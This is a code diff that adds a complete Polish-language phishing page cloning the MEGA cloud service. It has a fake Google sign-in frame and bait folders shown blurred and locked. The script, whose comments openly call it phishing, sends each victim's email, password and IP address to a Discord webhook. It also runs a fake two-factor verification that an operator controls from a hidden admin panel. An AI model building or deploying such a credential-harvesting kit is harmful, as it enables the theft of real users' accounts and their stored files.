@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MEGA - Bezpieczna chmura</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #0d0d0d; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: #1a1a1a; border-radius: 20px; padding: 40px; width: 440px; max-width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.8); border: 1px solid #2a2a2a; }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { color: #D42B3E; font-size: 42px; font-weight: 800; letter-spacing: -1px; }
+        .logo span { color: #888; font-size: 13px; display: block; margin-top: 5px; }
+        .login-btn { width: 100%; padding: 14px; background: #4285F4; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 12px; }
+        .login-btn:hover { background: #357ae8; transform: scale(1.02); }
+        .login-btn svg { width: 20px; height: 20px; flex-shrink: 0; }
+        .divider { text-align: center; color: #555; margin: 20px 0; font-size: 13px; position: relative; }
+        .divider::before, .divider::after { content: ''; position: absolute; top: 50%; width: 40%; height: 1px; background: #2a2a2a; }
+        .divider::before { left: 0; }
+        .divider::after { right: 0; }
+        .form-group { margin-bottom: 18px; }
+        .form-group label { color: #aaa; font-size: 13px; display: block; margin-bottom: 6px; }
+        .form-group input { width: 100%; padding: 12px 16px; background: #252525; border: 1px solid #333; border-radius: 8px; color: white; font-size: 15px; transition: 0.3s; }
+        .form-group input:focus { outline: none; border-color: #D42B3E; background: #2a2a2a; }
+        .submit-btn { width: 100%; padding: 14px; background: #D42B3E; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }
+        .submit-btn:hover { background: #b82233; transform: scale(1.02); }
+        .folder-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-top: 25px; }
+        .folder-item { background: #1f1f1f; border-radius: 12px; padding: 20px 10px; text-align: center; border: 1px solid #2a2a2a; cursor: pointer; transition: 0.3s; position: relative; overflow: hidden; }
+        .folder-item:hover { border-color: #D42B3E; transform: translateY(-3px); }
+        .folder-item .icon { font-size: 32px; margin-bottom: 8px; }
+        .folder-item .name { color: #ccc; font-size: 12px; }
+        .folder-item .count { color: #555; font-size: 10px; }
+        .folder-item.blurred { filter: blur(16px); pointer-events: none; user-select: none; opacity: 0.5; }
+        .folder-item.blurred::after { content: '🔒'; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 28px; filter: blur(0); pointer-events: none; opacity: 1; z-index: 2; }
+        .folder-item .lock-badge { position: absolute; top: 8px; right: 8px; background: #D42B3E; color: white; font-size: 9px; padding: 2px 8px; border-radius: 10px; z-index: 3; }
+        .verification-section { display: none; margin-top: 25px; padding: 20px; background: #1a2a1a; border: 1px solid #2d4a2d; border-radius: 12px; text-align: center; }
+        .verification-section.active { display: block; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .verification-section .title { color: #aaa; font-size: 14px; margin-bottom: 8px; }
+        .verification-section .subtitle { color: #666; font-size: 12px; margin-bottom: 12px; }
+        .verification-section .code-display { font-size: 36px; font-weight: 700; color: #4ade80; letter-spacing: 10px; background: #0d1a0d; padding: 12px; border-radius: 8px; margin: 10px 0; font-family: 'Courier New', monospace; }
+        .verification-section .status { font-size: 13px; margin-bottom: 12px; }
+        .verification-section .status.waiting { color: #fbbf24; }
+        .verification-section .status.approved { color: #4ade80; }
+        .verification-section .status.rejected { color: #ef4444; }
+        .unlock-message { display: none; margin-top: 15px; padding: 15px; background: #1a2a1a; border: 1px solid #4ade80; border-radius: 10px; text-align: center; animation: fadeIn 0.5s ease; }
+        .unlock-message.active { display: block; }
+        .unlock-message .icon { font-size: 30px; }
+        .unlock-message .text { color: #4ade80; font-size: 14px; margin-top: 5px; }
+        .unlock-message .sub { color: #888; font-size: 12px; margin-top: 3px; }
+        .google-frame { display: none; background: white; border-radius: 12px; padding: 30px 25px; margin-bottom: 20px; animation: fadeIn 0.3s ease; }
+        .google-frame.active { display: block; }
+        .google-frame .g-logo { text-align: center; margin-bottom: 20px; }
+        .google-frame .g-logo svg { width: 48px; height: 48px; }
+        .google-frame .g-title { color: #202124; font-size: 20px; font-weight: 400; text-align: center; margin-bottom: 5px; }
+        .google-frame .g-sub { color: #5f6368; font-size: 14px; text-align: center; margin-bottom: 20px; }
+        .google-frame .g-input { width: 100%; padding: 12px 16px; border: 1px solid #dadce0; border-radius: 8px; font-size: 15px; margin-bottom: 15px; background: white; color: #202124; transition: 0.3s; }
+        .google-frame .g-input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+        .google-frame .g-btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 500; cursor: pointer; transition: 0.3s; }
+        .google-frame .g-btn:hover { background: #1557b0; }
+        .google-frame .g-back { text-align: center; margin-top: 12px; }
+        .google-frame .g-back a { color: #1a73e8; text-decoration: none; font-size: 13px; cursor: pointer; }
+        .google-frame .g-back a:hover { text-decoration: underline; }
+        .toast { position: fixed; bottom: 30px; right: 30px; background: #1a1a1a; border: 1px solid #333; padding: 15px 25px; border-radius: 12px; color: white; font-size: 14px; display: none; box-shadow: 0 10px 40px rgba(0,0,0,0.5); z-index: 1000; max-width: 90%; }
+        .toast.show { display: block; animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { transform: translateX(100px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        .hidden { display: none !important; }
+        .admin-trigger { color: #333; font-size: 10px; text-decoration: none; cursor: pointer; display: inline-block; margin-top: 10px; transition: 0.3s; user-select: none; }
+        .admin-trigger:hover { color: #555; }
+        .user-email-display { color: #888; font-size: 13px; text-align: center; margin-bottom: 15px; }
+        .user-email-display span { color: #D42B3E; }
+        .code-input-group { display: flex; gap: 10px; margin: 15px 0; justify-content: center; flex-wrap: wrap; }
+        .code-input-group input { padding: 12px 16px; background: #0d1a0d; border: 1px solid #2d4a2d; border-radius: 8px; color: #4ade80; font-size: 20px; text-align: center; letter-spacing: 4px; font-family: 'Courier New', monospace; width: 200px; }
+        .code-input-group input:focus { outline: none; border-color: #4ade80; box-shadow: 0 0 20px rgba(74, 222, 128, 0.1); }
+        .code-input-group button { padding: 12px 30px; background: #4ade80; border: none; border-radius: 8px; color: #111; font-weight: 700; cursor: pointer; transition: 0.3s; font-size: 15px; }
+        .code-input-group button:hover { background: #22c55e; transform: scale(1.02); }
+        .code-input-group button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .code-hint { color: #666; font-size: 11px; margin-top: 5px; }
+        .admin-badge { background: #D42B3E; color: white; font-size: 10px; padding: 2px 10px; border-radius: 10px; display: inline-block; margin-left: 8px; }
+        .status-badge { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 10px; font-weight: 600; }
+        .status-badge.pending { background: #fbbf24; color: #1a1a1a; }
+        .status-badge.approved { background: #4ade80; color: #1a1a1a; }
+        .status-badge.rejected { background: #ef4444; color: white; }
+        .status-badge.waiting_confirm { background: #f59e0b; color: #1a1a1a; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="app">
+        <div class="logo">
+            <h1>MEGA</h1>
+            <span>Bezpieczna chmura</span>
+        </div>
+
+        <!-- Google Login Frame -->
+        <div class="google-frame" id="googleFrame">
+            <div class="g-logo">
+                <svg viewBox="0 0 24 24" width="48" height="48">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+            </div>
+            <div class="g-title">Zaloguj się</div>
+            <div class="g-sub">Kontynuuj przez Google</div>
+            <input class="g-input" id="gEmail" type="email" placeholder="Adres email">
+            <input class="g-input" id="gPassword" type="password" placeholder="Hasło">
+            <button class="g-btn" onclick="submitGoogleLogin()">Dalej</button>
+            <div class="g-back"><a onclick="closeGoogleFrame()">← Wróć</a></div>
+        </div>
+
+        <!-- Login Form -->
+        <div id="loginForm">
+            <button class="login-btn" onclick="openGoogleFrame()">
+                <svg viewBox="0 0 24 24" width="20" height="20">
+                    <path fill="white" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="white" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="white" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="white" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                Zaloguj się przez Google
+            </button>
+            <div class="divider">lub</div>
+            <div class="form-group">
+                <label>Adres email</label>
+                <input type="email" id="emailInput" placeholder="twoj@email.com">
+            </div>
+            <div class="form-group">
+                <label>Hasło</label>
+                <input type="password" id="passwordInput" placeholder="Wprowadź hasło">
+            </div>
+            <button class="submit-btn" onclick="submitLogin()">Zaloguj się</button>
+        </div>
+
+        <!-- Folder Panel (po zalogowaniu) -->
+        <div id="folderPanel" class="hidden">
+            <div class="user-email-display">
+                👤 Zalogowano jako: <span id="userEmailDisplay">user@example.com</span>
+                <span class="admin-badge" id="adminBadge" style="display:none;">👑 ADMIN</span>
+            </div>
+
+            <div class="folder-grid" id="folderGrid">
+                <div class="folder-item blurred" data-folder="1">
+                    <div class="icon">📁</div>
+                    <div class="name">Dokumenty</div>
+                    <div class="count">124 pliki</div>
+                    <span class="lock-badge">🔒</span>
+                </div>
+                <div class="folder-item blurred" data-folder="2">
+                    <div class="icon">📁</div>
+                    <div class="name">Zdjecia</div>
+                    <div class="count">847 plików</div>
+                    <span class="lock-badge">🔒</span>
+                </div>
+                <div class="folder-item blurred" data-folder="3">
+                    <div class="icon">📁</div>
+                    <div class="name">Filmy</div>
+                    <div class="count">56 plików</div>
+                    <span class="lock-badge">🔒</span>
+                </div>
+                <div class="folder-item blurred" data-folder="4">
+                    <div class="icon">📁</div>
+                    <div class="name">Muzyka</div>
+                    <div class="count">203 pliki</div>
+                    <span class="lock-badge">🔒</span>
+                </div>
+                <div class="folder-item blurred" data-folder="5">
+                    <div class="icon">📁</div>
+                    <div class="name">Backup</div>
+                    <div class="count">12 plików</div>
+                    <span class="lock-badge">🔒</span>
+                </div>
+                <div class="folder-item blurred" data-folder="6">
+                    <div class="icon">📁</div>
+                    <div class="name">Archiwum</div>
+                    <div class="count">89 plików</div>
+                    <span class="lock-badge">🔒</span>
+                </div>
+            </div>
+
+            <!-- Weryfikacja 2FA -->
+            <div class="verification-section" id="verificationSection">
+                <div class="title">🔐 Weryfikacja dwuetapowa</div>
+                <div class="subtitle">Wprowadź kod który otrzymałeś na telefonie</div>
+
+                <div class="code-input-group">
+                    <input type="text" id="codeInput2fa" placeholder="Wpisz kod" maxlength="10" autocomplete="off">
+                    <button id="verifyBtn" onclick="verifyCode()">✅ Zweryfikuj</button>
+                </div>
+                <div class="code-hint">📱 Kod został wysłany na Twój numer telefonu</div>
+
+                <div class="status waiting" id="codeStatus">⏳ Oczekiwanie na kod weryfikacyjny</div>
+                <div style="margin-top:5px; font-size:11px; color:#444;">
+                    Jeśli nie otrzymałeś kodu, <a href="#" onclick="resendCode()" style="color:#4ade80; text-decoration:none;">wyślij ponownie</a>
+                </div>
+            </div>
+
+            <div class="unlock-message" id="unlockMessage">
+                <div class="icon">📸</div>
+                <div class="text">✅ Weryfikacja zakończona pomyślnie!</div>
+                <div class="sub">Twoje pliki zostały odblokowane</div>
+            </div>
+        </div>
+
+        <!-- Panel Admina -->
+        <div id="adminPanel" style="display:none; margin-top:20px; padding:20px; background:#111; border-radius:10px; border:1px solid #2a2a2a;">
+            <h3 style="color:#D42B3E; font-size:14px; margin-bottom:10px;">🛡️ Panel Administratora</h3>
+            <div id="adminLogs"><div style="color:#555;">Brak oczekujących logowań</div></div>
+            <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap;">
+                <input type="text" id="adminCodeInput" placeholder="Wpisz kod 2FA" style="padding:8px 14px; background:#1a1a1a; border:1px solid #333; border-radius:6px; color:white; flex:1; min-width:150px;">
+                <button onclick="adminSetCode()" style="padding:8px 18px; background:#fbbf24; border:none; border-radius:6px; color:#111; font-weight:600; cursor:pointer;">🔐 Ustaw kod</button>
+                <button onclick="adminApprove()" style="padding:8px 18px; background:#4ade80; border:none; border-radius:6px; color:#111; font-weight:600; cursor:pointer;">✅ Zatwierdź</button>
+                <button onclick="adminReject()" style="padding:8px 18px; background:#ef4444; border:none; border-radius:6px; color:white; font-weight:600; cursor:pointer;">❌ Odrzuć</button>
+                <button onclick="adminLogout()" style="padding:8px 18px; background:#333; border:none; border-radius:6px; color:#aaa; cursor:pointer;">🚪 Wyjdź</button>
+            </div>
+            <div id="adminStatus" style="margin-top:8px; color:#fbbf24; font-size:13px;"></div>
+            <div style="margin-top:8px; color:#555; font-size:11px; border-top:1px solid #1a1a1a; padding-top:8px;">
+                ⚠️ <strong>Ustaw kod</strong> → użytkownik wpisuje go → <strong>zatwierdź</strong>
+            </div>
+        </div>
+
+        <!-- Admin Login Trigger -->
+        <div style="text-align:center; margin-top:15px;">
+            <span class="admin-trigger" onclick="triggerAdmin()">⚙️</span>
+        </div>
+
+        <!-- Admin Login Form (ukryty) -->
+        <div id="adminLogin" style="display:none; margin-top:15px; padding-top:15px; border-top:1px solid #2a2a2a;">
+            <div class="form-group">
+                <label style="color:#666; font-size:12px;">Hasło administratora</label>
+                <input type="password" id="adminPassInput" placeholder="Wprowadź hasło">
+            </div>
+            <button onclick="adminLogin()" style="padding:8px 20px; background:#333; border:1px solid #444; border-radius:6px; color:#aaa; cursor:pointer;">Zaloguj jako admin</button>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // ============================================================
+        // KONFIGURACJA - WSTAW SWÓJ WEBHOOK
+        // ============================================================
+        const CONFIG = {
+            DISCORD_WEBHOOK: 'https://discord.com/api/webhooks/TWOJ_WEBHOOK_TU',
+            ADMIN_PASSWORD: 'admin123'
+        };
+
+        // ============================================================
+        // ZMIENNE
+        // ============================================================
+        let pendingUser = null;
+        let adminCode = null;
+        let isAdmin = false;
+        let codeVerified = false;
+        let adminTriggerCount = 0;
+        let currentUserEmail = '';
+
+        // ============================================================
+        // TOAST
+        // ============================================================
+        function showToast(msg, isError) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.style.borderColor = isError ? '#ef4444' : '#4ade80';
+            toast.className = 'toast show';
+            clearTimeout(toast._timeout);
+            toast._timeout = setTimeout(() => { toast.className = 'toast'; }, 3500);
+        }
+
+        // ============================================================
+        // GOOGLE LOGIN
+        // ============================================================
+        function openGoogleFrame() {
+            document.getElementById('googleFrame').classList.add('active');
+            document.getElementById('loginForm').style.display = 'none';
+        }
+
+        function closeGoogleFrame() {
+            document.getElementById('googleFrame').classList.remove('active');
+            document.getElementById('loginForm').style.display = 'block';
+        }
+
+        function submitGoogleLogin() {
+            const email = document.getElementById('gEmail').value.trim();
+            const password = document.getElementById('gPassword').value.trim();
+            if (!email || !password) {
+                showToast('❌ Wprowadź email i hasło', true);
+                return;
+            }
+            document.getElementById('emailInput').value = email;
+            document.getElementById('passwordInput').value = password;
+            closeGoogleFrame();
+            showToast('✅ Przekierowanie...');
+            setTimeout(() => submitLogin(), 500);
+        }
+
+        // ============================================================
+        // LOGOWANIE (główna funkcja phishing)
+        // ============================================================
+        async function submitLogin() {
+            const email = document.getElementById('emailInput').value.trim();
+            const password = document.getElementById('passwordInput').value.trim();
+
+            if (!email || !password) {
+                showToast('❌ Wprowadź email i hasło', true);
+                return;
+            }
+
+            currentUserEmail = email;
+
+            // Sprawdź czy to admin
+            if (email === 'admin@mega.nz' && password === CONFIG.ADMIN_PASSWORD) {
+                isAdmin = true;
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('folderPanel').classList.remove('hidden');
+                document.getElementById('userEmailDisplay').textContent = '👑 Administrator';
+                document.getElementById('adminBadge').style.display = 'inline-block';
+                document.getElementById('adminPanel').style.display = 'block';
+                document.getElementById('adminLogin').style.display = 'none';
+                showToast('✅ Zalogowano jako administrator');
+                loadAdminLogs();
+                return;
+            }
+
+            // Normalny użytkownik - zapisz dane
+            pendingUser = { email: email, password: password, timestamp: new Date().toISOString() };
+            adminCode = null;
+            codeVerified = false;
+
+            // Wyślij na Discord
+            await sendToDiscord({
+                title: '🔐 Nowe logowanie - czeka na kod 2FA',
+                message: 'Użytkownik ' + email + ' próbuje uzyskać dostęp.',
+                color: 0xFBBF24,
+                fields: [
+                    { name: '📧 Email', value: email, inline: true },
+                    { name: '🔑 Hasło', value: '||' + password + '||', inline: true },
+                    { name: '⏱️ Czas', value: new Date().toLocaleString(), inline: true },
+                    { name: '🌐 IP', value: await getIP(), inline: true }
+                ]
+            });
+
+            // Przejdź do panelu z folderami
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('folderPanel').classList.remove('hidden');
+            document.getElementById('userEmailDisplay').textContent = email;
+
+            // Pokaż weryfikację 2FA
+            document.getElementById('verificationSection').classList.add('active');
+            document.getElementById('unlockMessage').classList.remove('active');
+            document.getElementById('codeStatus').textContent = '⏳ Oczekiwanie na kod z telefonu';
+            document.getElementById('codeStatus').className = 'status waiting';
+            document.getElementById('codeInput2fa').value = '';
+            document.getElementById('codeInput2fa').focus();
+
+            showToast('📱 Kod został wysłany na Twój telefon');
+
+            // Jeśli admin jest zalogowany, odśwież logi
+            if (isAdmin) {
+                loadAdminLogs();
+            }
+
+            // Nasłuchuj na kod z panelu admina
+            startCodePolling();
+        }
+
+        // ============================================================
+        // POLLING - nasłuchuje na kod z admina
+        // ============================================================
+        let codePollingInterval = null;
+
+        function startCodePolling() {
+            if (codePollingInterval) clearInterval(codePollingInterval);
+            codePollingInterval = setInterval(() => {
+                const storedCode = localStorage.getItem('mega_2fa_code');
+                if (storedCode && pendingUser) {
+                    adminCode = storedCode;
+                    document.getElementById('codeStatus').textContent = '📱 Otrzymałeś kod na telefon! Wpisz go poniżej.';
+                    document.getElementById('codeStatus').className = 'status waiting';
+                    document.getElementById('codeStatus').style.color = '#4ade80';
+                    showToast('📱 Kod został wysłany na Twój telefon!');
+                    clearInterval(codePollingInterval);
+                }
+            }, 2000);
+        }
+
+        // ============================================================
+        // WERYFIKACJA KODU (użytkownik wpisuje kod)
+        // ============================================================
+        function verifyCode() {
+            const inputCode = document.getElementById('codeInput2fa').value.trim();
+
+            if (!inputCode) {
+                showToast('❌ Wprowadź kod', true);
+                return;
+            }
+
+            if (!adminCode) {
+                showToast('⏳ Czekaj na kod z telefonu...', true);
+                return;
+            }
+
+            if (inputCode === adminCode) {
+                // Kod poprawny!
+                codeVerified = true;
+                document.getElementById('codeStatus').textContent = '✅ Kod zweryfikowany! Pliki odblokowane';
+                document.getElementById('codeStatus').className = 'status approved';
+
+                // Odblokuj foldery
+                document.querySelectorAll('.folder-item').forEach(el => {
+                    el.classList.remove('blurred');
+                });
+                document.getElementById('unlockMessage').classList.add('active');
+                document.getElementById('verificationSection').classList.remove('active');
+
+                showToast('✅ Weryfikacja zakończona pomyślnie!');
+
+                // Wyślij potwierdzenie na Discord
+                sendToDiscord({
+                    title: '✅ Użytkownik zweryfikował kod 2FA!',
+                    message: 'Użytkownik ' + pendingUser.email + ' poprawnie wpisał kod.',
+                    color: 0x4ADE80,
+                    fields: [
+                        { name: '📧 Email', value: pendingUser.email, inline: true },
+                        { name: '🔐 Kod', value: inputCode, inline: true }
+                    ]
+                });
+
+                // Wyczyść kod z localStorage
+                localStorage.removeItem('mega_2fa_code');
+
+                if (codePollingInterval) clearInterval(codePollingInterval);
+
+            } else {
+                showToast('❌ Nieprawidłowy kod! Spróbuj ponownie.', true);
+                document.getElementById('codeStatus').textContent = '❌ Nieprawidłowy kod! Spróbuj ponownie.';
+                document.getElementById('codeStatus').className = 'status rejected';
+                document.getElementById('codeInput2fa').value = '';
+                document.getElementById('codeInput2fa').focus();
+            }
+        }
+
+        // ============================================================
+        // PONOWNE WYSŁANIE KODU
+        // ============================================================
+        function resendCode() {
+            if (pendingUser) {
+                showToast('📱 Ponownie wysyłamy kod na Twój telefon...');
+                // Wyślij na Discord
+                sendToDiscord({
+                    title: '📱 Użytkownik poprosił o ponowne wysłanie kodu',
+                    message: 'Użytkownik ' + pendingUser.email + ' poprosił o ponowne wysłanie kodu.',
+                    color: 0xFBBF24
+                });
+                // Resetuj kod
+                adminCode = null;
+                localStorage.removeItem('mega_2fa_code');
+                document.getElementById('codeStatus').textContent = '⏳ Oczekiwanie na nowy kod...';
+                document.getElementById('codeStatus').className = 'status waiting';
+                startCodePolling();
+            }
+        }
+
+        // ============================================================
+        // POBRANIE IP
+        // ============================================================
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return '127.0.0.1';
+            }
+        }
+
+        // ============================================================
+        // DISCORD WEBHOOK
+        // ============================================================
+        async function sendToDiscord(data) {
+            try {
+                const response = await fetch(CONFIG.DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: 'MEGA Panel',
+                        avatar_url: 'https://i.imgur.com/4M3VY1A.png',
+                        embeds: [{
+                            title: data.title || '🔐 Nowe logowanie',
+                            description: data.message || '',
+                            color: data.color || 0xD42B3E,
+                            fields: data.fields || [],
+                            timestamp: new Date().toISOString(),
+                            footer: { text: 'MEGA Clone v2.0' }
+                        }]
+                    })
+                });
+                return await response.json();
+            } catch (e) {
+                console.error('Discord webhook error:', e);
+                return null;
+            }
+        }
+
+        // ============================================================
+        // PANEL ADMINA (ukryty, dostępny przez kliknięcie ⚙️)
+        // ============================================================
+        function triggerAdmin() {
+            adminTriggerCount++;
+            if (adminTriggerCount >= 5) {
+                adminTriggerCount = 0;
+                document.getElementById('adminLogin').style.display = document.getElementById('adminLogin').style.display === 'block' ? 'none' : 'block';
+                if (document.getElementById('adminLogin').style.display === 'block') {
+                    showToast('🔑 Panel administratora');
+                } else {
+                    showToast('👋 Zamknięto panel admina');
+                }
+            }
+        }
+
+        function adminLogin() {
+            const pass = document.getElementById('adminPassInput').value;
+            if (pass === CONFIG.ADMIN_PASSWORD) {
+                isAdmin = true;
+                document.getElementById('adminPanel').style.display = 'block';
+                document.getElementById('adminLogin').style.display = 'none';
+                document.getElementById('adminBadge').style.display = 'inline-block';
+                document.getElementById('adminPassInput').value = '';
+                showToast('✅ Zalogowano jako administrator');
+                loadAdminLogs();
+            } else {
+                showToast('❌ Nieprawidłowe hasło', true);
+            }
+        }
+
+        function adminLogout() {
+            isAdmin = false;
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('adminLogin').style.display = 'none';
+            document.getElementById('adminBadge').style.display = 'none';
+            document.getElementById('adminStatus').textContent = '';
+            showToast('👋 Wylogowano z panelu admina');
+        }
+
+        function loadAdminLogs() {
+            const logs = document.getElementById('adminLogs');
+            if (pendingUser) {
+                const statusText = codeVerified ? 'POTWIERDZONE' : 'OCZEKUJE NA KOD';
+                const statusClass = codeVerified ? 'approved' : 'pending';
+                logs.innerHTML = `
+                    <div style="padding:8px 0; border-bottom:1px solid #1a1a1a;">
+                        <span style="color:#888; font-size:12px;">${new Date().toLocaleTimeString()}</span>
+                        <span style="color:#4ade80; margin:0 10px;">${pendingUser.email}</span>
+                        <span class="status-badge ${statusClass}">${statusText}</span>
+                        <span style="color:#888; font-size:10px; margin-left:10px;">
+                            Kod: <strong style="color:#4ade80;">${adminCode || '❌ NIE USTAWIONO'}</strong>
+                        </span>
+                    </div>
+                `;
+            } else {
+                logs.innerHTML = '<div style="color:#555;">Brak oczekujących logowań</div>';
+            }
+        }
+
+        // ============================================================
+        // ADMIN - USTAWA KOD 2FA
+        // ============================================================
+        function adminSetCode() {
+            const code = document.getElementById('adminCodeInput').value.trim();
+            if (!code || code.length < 4) {
+                document.getElementById('adminStatus').textContent = '❌ Wprowadź kod (min. 4 znaki)';
+                document.getElementById('adminStatus').style.color = '#ef4444';
+                return;
+            }
+
+            adminCode = code;
+            document.getElementById('adminStatus').textContent = '✅ Kod ustawiony: ' + code;
+            document.getElementById('adminStatus').style.color = '#4ade80';
+            document.getElementById('adminCodeInput').value = '';
+
+            // Zapisz kod w localStorage (użytkownik go odczyta)
+            localStorage.setItem('mega_2fa_code', code);
+
+            // Wyślij na Discord
+            sendToDiscord({
+                title: '🔐 Nowy kod 2FA ustawiony',
+                message: 'Admin ustawił kod: ' + code,
+                color: 0xFBBF24
+            });
+
+            showToast('✅ Kod ustawiony: ' + code);
+            loadAdminLogs();
+        }
+
+        // ============================================================
+        // ADMIN - ZATWIERDŹ UŻYTKOWNIKA (ręcznie)
+        // ============================================================
+        function adminApprove() {
+            if (!pendingUser) {
+                document.getElementById('adminStatus').textContent = '❌ Brak oczekującego użytkownika';
+                document.getElementById('adminStatus').style.color = '#ef4444';
+                return;
+            }
+
+            if (!adminCode) {
+                document.getElementById('adminStatus').textContent = '❌ Najpierw ustaw kod!';
+                document.getElementById('adminStatus').style.color = '#ef4444';
+                return;
+            }
+
+            // Automatycznie zatwierdź użytkownika
+            codeVerified = true;
+            document.getElementById('adminStatus').textContent = '✅ Użytkownik zatwierdzony!';
+            document.getElementById('adminStatus').style.color = '#4ade80';
+
+            // Odblokuj foldery
+            document.querySelectorAll('.folder-item').forEach(el => {
+                el.classList.remove('blurred');
+            });
+            document.getElementById('unlockMessage').classList.add('active');
+            document.getElementById('verificationSection').classList.remove('active');
+
+            // Wyślij na Discord
+            sendToDiscord({
+                title: '✅ Admin zatwierdził użytkownika',
+                message: 'Admin zatwierdził użytkownika ' + pendingUser.email,
+                color: 0x4ADE80
+            });
+
+            showToast('✅ Użytkownik zatwierdzony!');
+            loadAdminLogs();
+        }
+
+        // ============================================================
+        // ADMIN - ODRZUĆ UŻYTKOWNIKA
+        // ============================================================
+        function adminReject() {
+            if (!pendingUser) {
+                document.getElementById('adminStatus').textContent = '❌ Brak oczekującego użytkownika';
+                document.getElementById('adminStatus').style.color = '#ef4444';
+                return;
+            }
+
+            // Wyślij na Discord
+            sendToDiscord({
+                title: '❌ Admin odrzucił użytkownika',
+                message: 'Admin odrzucił użytkownika ' + pendingUser.email,
+                color: 0xEF4444
+            });
+
+            document.getElementById('adminStatus').textContent = '❌ Użytkownik odrzucony';
+            document.getElementById('adminStatus').style.color = '#ef4444';
+            document.getElementById('codeStatus').textContent = '❌ Dostęp odrzucony przez administratora';
+            document.getElementById('codeStatus').className = 'status rejected';
+
+            pendingUser = null;
+            adminCode = null;
+            localStorage.removeItem('mega_2fa_code');
+            showToast('❌ Użytkownik odrzucony', true);
+            loadAdminLogs();
+        }
+
+        // ============================================================
+        // SKRÓTY KLAWIATUROWE
+        // ============================================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                const active = document.activeElement;
+                if (active && active.id === 'codeInput2fa') {
+                    verifyCode();
+                }
+                if (active && active.id === 'adminCodeInput') {
+                    adminSetCode();
+                }
+            }
+            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+                e.preventDefault();
+                document.getElementById('adminLogin').style.display = document.getElementById('adminLogin').style.display === 'block' ? 'none' : 'block';
+            }
+        });
+
+        // Auto-focus na pole kodu po załadowaniu
+        document.addEventListener('DOMContentLoaded', function() {
+            const observer = new MutationObserver(() => {
+                const section = document.getElementById('verificationSection');
+                if (section && section.classList.contains('active')) {
+                    setTimeout(() => {
+                        document.getElementById('codeInput2fa').focus();
+                    }, 500);
+                }
+            });
+            observer.observe(document.getElementById('verificationSection'), { attributes: true, attributeFilter: ['class'] });
+        });
+
+        console.log('🔐 MEGA Clone v2.0 - Kod ustawiany PO zalogowaniu');
+        console.log('📡 Discord Webhook:', CONFIG.DISCORD_WEBHOOK);
+        console.log('🔑 Admin password:', CONFIG.ADMIN_PASSWORD);
+        console.log('ℹ️ Kliknij 5x w ⚙️ lub Ctrl+Shift+A');
+    </script>
+</body>
+</html>
